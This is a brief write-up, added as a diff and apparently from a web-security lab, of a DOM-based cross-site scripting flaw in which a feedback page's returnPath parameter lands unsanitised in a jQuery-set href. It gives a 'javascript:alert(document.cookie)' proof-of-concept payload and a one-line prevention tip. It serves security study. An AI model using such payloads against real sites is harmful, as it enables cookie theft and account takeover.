@@ -1,0 +1,16 @@
+Vulnerability:
+	The server puts the returnPath URL parameter (location.search) directly into an href attribute using jQuery,
+	Allowing an attacker to inject JavaScript and execute it.
+	
+Exploit:
+	Example:
+		/feedback?returnPath=javascript:[PAYLOAD];		
+	
+	Exploit Script:
+		/feedback?returnPath=javascript:alert(document.cookie);
+	
+Explanation:
+	The "returnPath" value is inserted directly in the href attribute and executed without any sanitization.
+	
+Prevention:
+	Sanitize and filter the input.
